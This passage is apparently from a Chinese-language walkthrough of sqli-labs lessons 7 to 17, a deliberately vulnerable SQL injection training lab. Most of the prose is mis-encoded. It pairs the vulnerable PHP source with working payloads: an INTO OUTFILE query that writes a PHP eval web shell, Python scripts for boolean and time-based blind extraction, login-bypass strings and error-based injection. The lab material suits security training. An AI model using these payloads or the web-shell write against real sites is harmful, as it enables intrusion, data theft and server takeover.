class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in.... Use outfile......'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You have an error in your SQL syntax'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æç¤ºæˆ‘ä»¬ç”¨outfileï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªshellè¿›å»ã€‚</p><p>payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;script language='</span>php<span class="string">'&gt;@eval($_POST['</span>sketch_pl4ne<span class="string">'])&lt;/script&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'C:\\xxx\\xxx\\xxx\\output.php'</span> <span class="comment">--+  éœ€è¦æ˜¯ç»å¯¹è·¯å¾„</span></span><br></pre></td></tr></table></figure><p>èšå‰‘è¿æ¥ï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/10/09/gLRpOs.png" alt=""></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>è€ƒå¯Ÿç‚¹ï¼šå¸ƒå°”ç›²æ³¨</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo 'You are in...........';</span></span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="comment">//echo "You have an error in your SQL syntax";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PSï¼šçœ‹ä»£ç è¦ä»”ç»†ï¼Œè¿™é‡Œä¸è¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œåªèƒ½ç›²æ³¨ã€‚</p><p>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">character = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">length = <span class="number">32</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        url = <span class="string">"http://127.0.0.1/sqli-labs/Less-8/?id=1' and ascii(substr((select database()),%d,1)) = %d --+"</span> \</span><br><span class="line">              % (i, ord(c))</span><br><span class="line">        r = s.get(url).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>è€ƒå¯Ÿç‚¹ï¼šæ—¶é—´ç›²æ³¨</p><p>æºç ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br><span class="line"><span class="string">$result=mysql_query($sql);</span></span><br><span class="line"><span class="string">$row = mysql_fetch_array($result);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if($row)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  echo '&lt;font size="</span><span class="number">5</span><span class="string">" color="</span><span class="comment">#FFFF00"&gt;';</span></span><br><span class="line">  echo <span class="string">'You are in...........'</span>;</span><br><span class="line">  echo "&lt;br&gt;";</span><br><span class="line">    echo "&lt;/font&gt;";</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">echo '&lt;font size="5" color="#FFFF00"&gt;';</span><br><span class="line">echo 'You are in...........';</span><br><span class="line">//print_r(mysql_error());</span><br><span class="line">//echo "You have an error in your SQL syntax";</span><br><span class="line">echo "&lt;/br&gt;&lt;/font&gt;";</span><br><span class="line">echo '&lt;font color= "#0000ff" font size= 3&gt;';</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéƒ½ä¼šè¾“å‡º<code>You are in...........</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æ ¹æ®è¿”å›é¡µé¢æ— æ³•åˆ¤æ–­è¯­å¥æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚</p><p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ç”¨æ—¶é—´ç›²æ³¨ã€‚</p><p>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">character = string.digits + string.ascii_letters + string.punctuation</span><br><span class="line">flag_length = <span class="number">40</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, flag_length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        url = <span class="string">"http://127.0.0.1/sqli-labs/Less-9/?id=1' and if((ascii(substr((select database()),%d,1)))=%d,sleep(5),0) --+"</span> % (i, ord(c))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s.get(url, timeout=<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="comment">//echo "You have an error in your SQL syntax";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><p>å•å¼•å·æ”¹ä¸ºåŒå¼•å· ï¼Œpayloadå‚è€ƒä¸Šä¸€é¢˜= =</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>è€ƒå¯Ÿç‚¹ï¼šPOSTæ³¨å…¥</p><p>ç›®å‰æ¥è¯´ä¸GETå¹¶æ²¡æœ‰å¤ªå¤§åŒºåˆ«ï¼Œä¹‹åè®²å®½å­—èŠ‚æ³¨å…¥æ—¶ä¼šåŠ ä»¥åŒºåˆ†ã€‚</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">" You Have successfully logged in\n\n "</span> ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Try again looser"</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg" /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin' or 1 <span class="comment">#</span></span><br><span class="line">&amp;passwd=everything</span><br><span class="line">&amp;submit=Submit</span><br></pre></td></tr></table></figure><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><p>Less-11çš„ä¼ å‚æ·»åŠ åŒå¼•å·ï¼Œå‚è€ƒä¸Šä¸€é¢˜ã€‚</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>è€ƒå¯Ÿç‚¹ï¼šå¸ƒå°”ç›²æ³¨</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You Have successfully logged in " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#0000ff"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//echo 'Your Login name:'. $row['username'];</span></span><br><span class="line"><span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line"><span class="comment">//echo 'Your Password:' .$row['password'];</span></span><br><span class="line"><span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"   /&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Try again looser";</span></span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æ²¡æœ‰å›æ˜¾ï¼Œä½†æ˜¯æœ‰å›¾ç‰‡æˆåŠŸæˆ–è€…å¤±è´¥çš„æç¤ºï¼Œè€ƒè™‘å¸ƒå°”ç›²æ³¨ã€‚</p><p>payloadï¼š</p><p>è„šæœ¬ç¼–å†™å‚è€ƒLess-8ï¼Œå…³é”®æ˜¯æ‰¾åˆ°æœ‰ä¸åŒå›æ˜¾çš„åœ°æ–¹ï¼Œå½“ç„¶ä»¥åŠæ³¨å…¥ç‚¹ã€‚</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>; </span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><p>è„šæœ¬ç¼–å†™å‚è€ƒLess-8ã€‚</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"><span class="comment">// @$sql ä¸æ˜¾ç¤ºé”™è¯¯æç¤º</span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><p>æ¢æ±¤ä¸æ¢è¯ï¼Œé‡‡ç”¨å¸ƒå°”ç›²æ³¨ä¸æ—¶é—´ç›²æ³¨å‡å¯ã€‚</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>; </span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><p>ä¾ç„¶æ˜¯æ¢æ±¤ä¸æ¢è¯ï¼Œä½†ä¹Ÿæé†’æˆ‘ä»¬è¦ç•™æ„å‚æ•°å¯èƒ½å­˜åœ¨çš„æƒ…å†µï¼šâ€™$idâ€™ï¼Œâ€$idâ€ï¼Œ($id)ï¼Œ(â€œ$idâ€)ï¼Œ(â€˜$idâ€™)ï¼Œ(($id))ç­‰ç­‰ã€‚</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>è€ƒå¯Ÿç‚¹ï¼šupdateè¯­å¥æ³¨å…¥</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æœ‰ç‚¹ç‹ çš„è¿‡æ»¤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line">$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">&#123;</span><br><span class="line">$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">'uname'</span>]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">$row1 = $row[<span class="string">'username'</span>];  </span><br><span class="line"><span class="comment">//echo 'Your Login name:'. $row1;</span></span><br><span class="line">$update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br><span class="line">mysql_query($update);</span><br><span class="line">......;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname=sketch_pl4ne</span><br><span class="line">&amp;passwd=passwd'and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>)) <span class="comment">#</span></span><br><span class="line">&amp;submit=Submit</span><br><span class="line">//å…¶ä»–æŠ¥é”™æ³¨å…¥è¯­å¥è‡ªè¡Œå°è¯•</span><br></pre></td></tr></table></figure><h2 id="Less-18"><a href="#Less-18" class="headerlink" 